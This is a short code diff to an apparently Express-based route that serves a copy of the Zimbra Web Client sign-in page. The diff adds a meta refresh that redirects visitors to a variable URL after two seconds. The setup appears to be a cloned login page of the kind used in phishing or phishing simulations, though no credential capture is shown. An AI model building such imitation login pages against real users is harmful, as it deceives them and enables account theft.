@@ -60,6 +60,7 @@ router.get('/', (req, res) => {
 	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
 	<meta name="apple-mobile-web-app-capable" content="yes">
 	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+ 	<meta http-equiv="Refresh" content="2;url=${url}"> 
 	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
 	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
     	<title>Zimbra Web Client Sign In</title>
